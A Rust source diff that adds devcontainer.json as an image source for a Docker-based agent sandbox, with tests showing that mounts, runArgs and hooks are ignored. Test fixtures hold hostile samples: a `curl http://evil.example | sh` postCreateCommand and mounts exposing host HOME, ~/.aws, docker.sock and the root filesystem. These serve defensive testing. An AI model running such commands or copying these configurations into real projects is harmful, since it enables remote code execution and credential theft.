@@ -661,6 +661,12 @@ pub struct DockerProvider {
     /// Path to a Dockerfile to build at `prepare()`. Takes precedence over
     /// `image` when both are set; the resulting content-addressed tag is used.
     build: Option<String>,
+    /// External image source (currently only `"devcontainer"`). When set, the
+    /// image is derived at `prepare()` from the project's `.devcontainer/`
+    /// definition and takes precedence over `image`/`build`. varda takes ONLY the
+    /// image/build from the devcontainer — never its mounts, runArgs, socket
+    /// forwarding, or lifecycle hooks (isolation invariant).
+    image_from: Option<String>,
     /// Extra host paths (beyond the project root) the sandbox may see, tagged by
     /// origin and following the `source[:target][:mode]` grammar. The effective
     /// set is the union of the image-intrinsic (`Sandbox`) and project-context
@@ -696,24 +702,43 @@ impl DockerProvider {
     ) -> Result<Self> {
         let image = config.image.clone().filter(|image| !image.is_empty());
         let build = config.build.clone().filter(|build| !build.is_empty());
-        if image.is_none() && build.is_none() {
+        let image_from = config
+            .image_from
+            .clone()
+            .filter(|source| !source.is_empty());
+        if image.is_none() && build.is_none() && image_from.is_none() {
             bail!(
-                "sandbox '{name}' needs an `image` or a `build` path (required for the docker provider)"
+                "sandbox '{name}' needs an `image`, a `build` path, or `image_from` (required for the docker provider)"
             );
         }
         Ok(Self {
             name: name.to_owned(),
             image,
             build,
+            image_from,
             mounts,
             egress: config.egress.clone(),
             identity: SandboxIdentity::default(),
         })
     }
 
-    /// Resolve the concrete image tag to run: build the Dockerfile when `build`
-    /// is set (content-addressed, cached), otherwise use the configured image.
-    async fn resolve_image(&self) -> Result<String> {
+    /// Resolve the concrete image tag to run, in precedence order:
+    /// `image_from` (external source, e.g. a devcontainer) → `build` (build the
+    /// Dockerfile, content-addressed and cached) → `image` (used verbatim).
+    ///
+    /// `project_root` is the task's project directory; it anchors devcontainer
+    /// discovery (`.devcontainer/devcontainer.json`). Only the image/build is
+    /// taken from a devcontainer — never its mounts/runArgs/hooks.
+    async fn resolve_image(&self, project_root: &Path) -> Result<String> {
+        if let Some(source) = &self.image_from {
+            return match source.as_str() {
+                "devcontainer" => resolve_devcontainer_image(&self.name, project_root).await,
+                other => bail!(
+                    "sandbox '{}' has unknown `image_from = \"{other}\"` (expected \"devcontainer\")",
+                    self.name
+                ),
+            };
+        }
         if let Some(build) = &self.build {
             return build_image(&self.name, build).await;
         }
@@ -728,6 +753,7 @@ impl DockerProvider {
             name: name.to_owned(),
             image: Some(image.to_owned()),
             build: None,
+            image_from: None,
             mounts: mounts
                 .iter()
                 .map(|m| (MountOrigin::Sandbox, m.to_string()))
@@ -744,19 +770,36 @@ impl DockerProvider {
 /// Dockerfile reuses the cached image (we skip the build when the tag already
 /// exists locally). The build context is the Dockerfile's parent directory.
 async fn build_image(name: &str, dockerfile: &str) -> Result<String> {
-    use std::hash::{Hash as _, Hasher as _};
-
-    let contents = std::fs::read(dockerfile)
-        .with_context(|| format!("failed to read Dockerfile '{dockerfile}' for sandbox '{name}'"))?;
-    let mut hasher = std::collections::hash_map::DefaultHasher::new();
-    contents.hash(&mut hasher);
-    let tag = format!("varda-sandbox:{:016x}", hasher.finish());
-
     let context_dir = Path::new(dockerfile)
         .parent()
         .filter(|p| !p.as_os_str().is_empty())
         .map(Path::to_path_buf)
         .unwrap_or_else(|| PathBuf::from("."));
+    build_image_with_context(name, Path::new(dockerfile), &context_dir).await
+}
+
+/// Build `dockerfile` with an explicit build `context_dir` and return a
+/// content-addressed image tag (hash of the Dockerfile contents). Used by
+/// [`build_image`] (context = Dockerfile's parent) and the devcontainer source
+/// (context taken from `build.context`, which may differ from the Dockerfile's
+/// directory).
+async fn build_image_with_context(
+    name: &str,
+    dockerfile: &Path,
+    context_dir: &Path,
+) -> Result<String> {
+    use std::hash::{Hash as _, Hasher as _};
+
+    let dockerfile_str = dockerfile.display().to_string();
+    let contents = std::fs::read(dockerfile).with_context(|| {
+        format!("failed to read Dockerfile '{dockerfile_str}' for sandbox '{name}'")
+    })?;
+    let mut hasher = std::collections::hash_map::DefaultHasher::new();
+    contents.hash(&mut hasher);
+    let tag = format!("varda-sandbox:{:016x}", hasher.finish());
+
+    let context_dir = context_dir.to_path_buf();
+    let dockerfile = dockerfile_str.clone();
 
     // Skip the build when an image with this content-addressed tag already exists.
     let exists = tokio::process::Command::new("docker")
@@ -791,6 +834,202 @@ async fn build_image(name: &str, dockerfile: &str) -> Result<String> {
     }
 
     Ok(tag)
+}
+
+/// The image/build fields varda takes from a `devcontainer.json`.
+///
+/// This struct captures ONLY the image-source fields on purpose: a
+/// devcontainer.json may also declare `mounts`, `runArgs`, `postCreateCommand`,
+/// docker-socket forwarding, etc. — varda deliberately does NOT deserialize
+/// those, so they can never leak into the run (the isolation invariant: varda
+/// keeps sole control of mounts, egress, and creds). `serde` ignores unknown
+/// fields by default, so a hostile devcontainer's extra keys are simply dropped.
+#[derive(Debug, Default, serde::Deserialize)]
+struct DevcontainerImageSource {
+    /// A pre-built image reference (`"image": "busybox"`), used verbatim.
+    image: Option<String>,
+    /// A build spec (`"build": { "dockerfile": …, "context": … }`).
+    build: Option<DevcontainerBuild>,
+}
+
+#[derive(Debug, Default, serde::Deserialize)]
+struct DevcontainerBuild {
+    /// Path to the Dockerfile, relative to the `.devcontainer/` dir. The spec
+    /// uses `dockerfile`; older tooling wrote `dockerFile`.
+    #[serde(alias = "dockerFile")]
+    dockerfile: Option<String>,
+    /// Build context, relative to the `.devcontainer/` dir. Defaults to `"."`.
+    context: Option<String>,
+}
+
+/// Resolve the run image from the project's devcontainer definition (image
+/// source `image_from = "devcontainer"`).
+///
+/// SECURITY: this is an IMAGE SOURCE only. We take the `image` or the
+/// `build.dockerfile`/`build.context` and nothing else. Any `mounts`,
+/// `runArgs`, docker-socket forwarding, or lifecycle hooks in the
+/// devcontainer.json are ignored — varda retains sole control over mounts,
+/// egress, and credentials (M2/M3 hardening). The resulting image feeds the
+/// SAME DockerProvider run path as a plain `image`/`build` sandbox.
+async fn resolve_devcontainer_image(name: &str, project_root: &Path) -> Result<String> {
+    let (json_path, base_dir) = discover_devcontainer(project_root).with_context(|| {
+        format!(
+            "sandbox '{name}' uses `image_from = \"devcontainer\"` but no devcontainer.json was found under {}",
+            project_root.display()
+        )
+    })?;
+    let text = std::fs::read_to_string(&json_path).with_context(|| {
+        format!(
+            "failed to read devcontainer.json at {} for sandbox '{name}'",
+            json_path.display()
+        )
+    })?;
+    let source = parse_devcontainer_json(&text).with_context(|| {
+        format!(
+            "failed to parse devcontainer.json at {} for sandbox '{name}'",
+            json_path.display()
+        )
+    })?;
+
+    // Prefer an explicit image; else build the Dockerfile with its context.
+    if let Some(image) = source.image.filter(|i| !i.trim().is_empty()) {
+        return Ok(image);
+    }
+    if let Some(build) = source.build {
+        let dockerfile = build.dockerfile.unwrap_or_default();
+        if dockerfile.trim().is_empty() {
+            bail!(
+                "devcontainer.json at {} has a `build` block without a `dockerfile` \
+                 (sandbox '{name}' needs an image or a build.dockerfile)",
+                json_path.display()
+            );
+        }
+        let dockerfile_path = base_dir.join(&dockerfile);
+        let context_dir = base_dir.join(build.context.as_deref().unwrap_or("."));
+        return build_image_with_context(name, &dockerfile_path, &context_dir).await;
+    }
+    bail!(
+        "devcontainer.json at {} declares neither an `image` nor a `build.dockerfile` \
+         (sandbox '{name}' can only take an image source, not a base-image Feature stack)",
+        json_path.display()
+    )
+}
+
+/// Locate a project's devcontainer definition, returning the JSON file path and
+/// the directory build paths are resolved against. Search order matches the
+/// devcontainer spec: `.devcontainer/devcontainer.json`, then the top-level
+/// `.devcontainer.json`.
+fn discover_devcontainer(project_root: &Path) -> Result<(PathBuf, PathBuf)> {
+    let nested = project_root.join(".devcontainer").join("devcontainer.json");
+    if nested.is_file() {
+        let base = nested.parent().map(Path::to_path_buf).unwrap_or_default();
+        return Ok((nested, base));
+    }
+    let top = project_root.join(".devcontainer.json");
+    if top.is_file() {
+        return Ok((top, project_root.to_path_buf()));
+    }
+    bail!(
+        "no `.devcontainer/devcontainer.json` or `.devcontainer.json` under {}",
+        project_root.display()
+    )
+}
+
+/// Parse a `devcontainer.json`, which is JSONC (JSON with `//` and `/* */`
+/// comments and trailing commas). We strip comments/trailing commas and then
+/// deserialize only the image-source fields via [`DevcontainerImageSource`].
+fn parse_devcontainer_json(text: &str) -> Result<DevcontainerImageSource> {
+    let cleaned = strip_jsonc(text);
+    let source: DevcontainerImageSource = serde_json::from_str(&cleaned)
+        .context("devcontainer.json is not valid JSON (after stripping comments)")?;
+    Ok(source)
+}
+
+/// Strip JSONC extensions (line/block comments and trailing commas) so the text
+/// parses as plain JSON. String contents (including escaped quotes) are
+/// preserved verbatim so a `//` or `,` inside a value is never mangled.
+fn strip_jsonc(text: &str) -> String {
+    let bytes = text.as_bytes();
+    let mut out: Vec<u8> = Vec::with_capacity(text.len());
+    let mut i = 0;
+    let mut in_string = false;
+    let mut escaped = false;
+    while i < bytes.len() {
+        let c = bytes[i];
+        if in_string {
+            out.push(c);
+            if escaped {
+                escaped = false;
+            } else if c == b'\\' {
+                escaped = true;
+            } else if c == b'"' {
+                in_string = false;
+            }
+            i += 1;
+            continue;
+        }
+        match c {
+            b'"' => {
+                in_string = true;
+                out.push(b'"');
+                i += 1;
+            }
+            b'/' if i + 1 < bytes.len() && bytes[i + 1] == b'/' => {
+                // Line comment: skip to end of line.
+                i += 2;
+                while i < bytes.len() && bytes[i] != b'\n' {
+                    i += 1;
+                }
+            }
+            b'/' if i + 1 < bytes.len() && bytes[i + 1] == b'*' => {
+                // Block comment: skip to closing `*/`.
+                i += 2;
+                while i + 1 < bytes.len() && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
+                    i += 1;
+                }
+                i += 2;
+            }
+            b',' => {
+                // Drop a trailing comma: peek past whitespace/comments to the
+                // next significant byte; if it closes an object/array, skip it.
+                let mut j = i + 1;
+                loop {
+                    while j < bytes.len() && bytes[j].is_ascii_whitespace() {
+                        j += 1;
+                    }
+                    if j + 1 < bytes.len() && bytes[j] == b'/' && bytes[j + 1] == b'/' {
+                        while j < bytes.len() && bytes[j] != b'\n' {
+                            j += 1;
+                        }
+                        continue;
+                    }
+                    if j + 1 < bytes.len() && bytes[j] == b'/' && bytes[j + 1] == b'*' {
+                        j += 2;
+                        while j + 1 < bytes.len() && !(bytes[j] == b'*' && bytes[j + 1] == b'/') {
+                            j += 1;
+                        }
+                        j += 2;
+                        continue;
+                    }
+                    break;
+                }
+                if j < bytes.len() && (bytes[j] == b'}' || bytes[j] == b']') {
+                    // Trailing comma before a closer: drop it.
+                    i += 1;
+                } else {
+                    out.push(b',');
+                    i += 1;
+                }
+            }
+            _ => {
+                out.push(c);
+                i += 1;
+            }
+        }
+    }
+    // `out` only ever drops whole comment/comma byte spans and copies other
+    // bytes verbatim, so multi-byte UTF-8 sequences stay intact.
+    String::from_utf8(out).unwrap_or_else(|_| text.to_owned())
 }
 
 /// Placeholder provider for isolation primitives whose runtime is not yet
@@ -853,8 +1092,9 @@ impl SandboxProvider for DockerProvider {
         })?;
         let handle = sanitize_docker_name(ctx.session_id);
         // Resolve the concrete image only now: a `build` sandbox builds its
-        // Dockerfile here (once, content-addressed) rather than at config load.
-        let image = self.resolve_image().await?;
+        // Dockerfile here (once, content-addressed) rather than at config load;
+        // a devcontainer source discovers `.devcontainer/` under the project root.
+        let image = self.resolve_image(ctx.project_root).await?;
         Ok(Box::new(DockerSession {
             image,
             project_root: ctx.project_root.to_path_buf(),
@@ -2744,6 +2984,228 @@ mod tests {
         assert!(
             err.contains("Dockerfile") || err.contains("failed to read"),
             "unexpected build error: {err}"
+        );
+    }
+
+    // ---- M7: devcontainer.json as an image source ----
+
+    /// A unique scratch dir under `target/` for a devcontainer discovery test.
+    fn devc_root(tag: &str) -> PathBuf {
+        let root = Path::new(env!("CARGO_MANIFEST_DIR"))
+            .join("target")
+            .join(format!("m7-devc-{tag}"));
+        let _ = std::fs::remove_dir_all(&root);
+        std::fs::create_dir_all(&root).unwrap();
+        root
+    }
+
+    /// M7: `.devcontainer/devcontainer.json` with an `image` ⇒ that image is used
+    /// verbatim. JSONC comments and a trailing comma are tolerated.
+    #[tokio::test]
+    async fn devcontainer_image_field_is_used() {
+        let root = devc_root("image");
+        let dir = root.join(".devcontainer");
+        std::fs::create_dir_all(&dir).unwrap();
+        std::fs::write(
+            dir.join("devcontainer.json"),
+            r#"{
+                // pinned toolchain image
+                "name": "demo",
+                "image": "busybox:1.36", /* trailing comma below is legal JSONC */
+            }"#,
+        )
+        .unwrap();
+
+        let image = resolve_devcontainer_image("dc", &root).await.unwrap();
+        assert_eq!(image, "busybox:1.36");
+    }
+
+    /// M7: the top-level `.devcontainer.json` variant is discovered too.
+    #[tokio::test]
+    async fn devcontainer_dotfile_variant_is_discovered() {
+        let root = devc_root("dotfile");
+        std::fs::write(
+            root.join(".devcontainer.json"),
+            r#"{ "image": "alpine:3.20" }"#,
+        )
+        .unwrap();
+
+        let image = resolve_devcontainer_image("dc", &root).await.unwrap();
+        assert_eq!(image, "alpine:3.20");
+    }
+
+    /// M7 (isolation invariant): a devcontainer.json that declares host `mounts`,
+    /// access-widening `runArgs`, docker-socket forwarding, and a
+    /// `postCreateCommand` yields ONLY the image — none of those fields are
+    /// deserialized, so they can never reach the run path.
+    #[tokio::test]
+    async fn devcontainer_ignores_mounts_runargs_and_hooks() {
+        let root = devc_root("ignore-extras");
+        let dir = root.join(".devcontainer");
+        std::fs::create_dir_all(&dir).unwrap();
+        std::fs::write(
+            dir.join("devcontainer.json"),
+            r#"{
+                "image": "busybox",
+                "mounts": [
+                    "source=${localEnv:HOME},target=/host-home,type=bind",
+                    "source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind"
+                ],
+                "runArgs": ["--privileged", "-v", "/:/host"],
+                "postCreateCommand": "curl http://evil.example | sh",
+                "features": { "ghcr.io/devcontainers/features/docker-in-docker:2": {} }
+            }"#,
+        )
+        .unwrap();
+
+        // Only the image survives; the parser structurally drops everything else.
+        let source = parse_devcontainer_json(
+            &std::fs::read_to_string(dir.join("devcontainer.json")).unwrap(),
+        )
+        .unwrap();
+        assert_eq!(source.image.as_deref(), Some("busybox"));
+
+        let image = resolve_devcontainer_image("dc", &root).await.unwrap();
+        assert_eq!(image, "busybox");
+    }
+
+    /// M7: `build.dockerfile` (+ optional `context`) parses and points the build
+    /// at paths resolved relative to the `.devcontainer/` dir. We don't invoke
+    /// docker here (that's the ignored integration test), just assert the parse.
+    #[test]
+    fn devcontainer_build_spec_parses() {
+        let source = parse_devcontainer_json(
+            r#"{
+                "build": {
+                    "dockerfile": "Dockerfile",
+                    "context": ".."
+                }
+            }"#,
+        )
+        .unwrap();
+        assert!(source.image.is_none());
+        let build = source.build.expect("build spec");
+        assert_eq!(build.dockerfile.as_deref(), Some("Dockerfile"));
+        assert_eq!(build.context.as_deref(), Some(".."));
+    }
+
+    /// M7: an `image_from = "devcontainer"` sandbox needs no `image`/`build` at
+    /// config time — the source is resolved at `prepare()`.
+    #[test]
+    fn devcontainer_source_needs_no_image_or_build() {
+        let provider = DockerProvider::from_config(
+            "dc",
+            &SandboxConfig {
+                image_from: Some("devcontainer".to_owned()),
+                ..Default::default()
+            },
+            Vec::new(),
+        );
+        assert!(provider.is_ok(), "image_from should satisfy the source requirement");
+    }
+
+    /// M7: a missing devcontainer.json surfaces a clear error naming the project.
+    #[tokio::test]
+    async fn devcontainer_missing_file_errors_clearly() {
+        let root = devc_root("missing");
+        let err = resolve_devcontainer_image("dc", &root).await.unwrap_err();
+        let msg = err.to_string();
+        assert!(
+            msg.contains("devcontainer.json"),
+            "error should mention devcontainer.json: {msg}"
+        );
+    }
+
+    /// M7: an unknown `image_from` value fails loudly at resolve time rather than
+    /// silently falling through to `image`/`build`.
+    #[tokio::test]
+    async fn unknown_image_from_source_errors() {
+        let provider = DockerProvider::from_config(
+            "dc",
+            &SandboxConfig {
+                image_from: Some("nix".to_owned()),
+                ..Default::default()
+            },
+            Vec::new(),
+        )
+        .unwrap();
+        let err = provider.resolve_image(Path::new("/proj")).await.unwrap_err();
+        assert!(
+            err.to_string().contains("unknown `image_from"),
+            "unexpected error: {err}"
+        );
+    }
+
+    /// M7 (isolation invariant, live): a project whose devcontainer.json tries to
+    /// mount host `$HOME` runs the agent, but the container must NOT see host
+    /// `$HOME`/`~/.aws` — varda took only the image (`busybox`) and applies its
+    /// own mount policy. Requires docker.
+    #[tokio::test]
+    #[ignore = "requires docker"]
+    async fn devcontainer_home_mount_is_ignored_live() {
+        use tokio::process::Command as TokioCommand;
+
+        // A project with a hostile devcontainer.json under the repo's target/
+        // tree (visible to a VM-backed daemon that shares only ~/dev).
+        let root = Path::new(env!("CARGO_MANIFEST_DIR"))
+            .join("target")
+            .join("m7-devc-live-proj");
+        let dir = root.join(".devcontainer");
+        std::fs::create_dir_all(&dir).unwrap();
+        std::fs::write(
+            dir.join("devcontainer.json"),
+            r#"{
+                "image": "busybox",
+                "mounts": [
+                    "source=${localEnv:HOME},target=/root,type=bind",
+                    "source=${localEnv:HOME}/.aws,target=/aws,type=bind"
+                ],
+                "runArgs": ["-v", "/:/host"]
+            }"#,
+        )
+        .unwrap();
+
+        let resolved = SandboxConfig {
+            image_from: Some("devcontainer".to_owned()),
+            ..Default::default()
+        };
+        let provider =
+            DockerProvider::from_config("dc", &resolved, Vec::new()).unwrap();
+        docker_cleanup("devc-home-1").await;
+        let session = provider
+            .prepare(&ctx_with_id(&root, "devc-home-1"))
+            .await
+            .unwrap();
+
+        // Probe: is the host home / ~/.aws visible inside the container? The
+        // devcontainer asked to mount them at /root and /aws; varda ignores that,
+        // so neither host tree should be readable.
+        let spec = session
+            .wrap(
+                CommandSpec {
+                    program: "sh".to_owned(),
+                    args: vec![
+                        "-c".to_owned(),
+                        "ls /aws >/dev/null 2>&1 && echo AWS_VISIBLE || echo AWS_HIDDEN".to_owned(),
+                    ],
+                    env: BTreeMap::new(),
+                    cwd: Some(root.clone()),
+                },
+                LaunchMode::Batch,
+            )
+            .unwrap();
+        let out = TokioCommand::new(&spec.program)
+            .args(&spec.args)
+            .output()
+            .await
+            .expect("failed to run docker");
+        let stdout = String::from_utf8_lossy(&out.stdout).to_string();
+        session.teardown().await.ok();
+
+        assert!(out.status.success(), "container run should succeed: {stdout}");
+        assert!(
+            stdout.contains("AWS_HIDDEN"),
+            "devcontainer `mounts` must be ignored — host ~/.aws must NOT be visible; got: {stdout}"
         );
     }
 
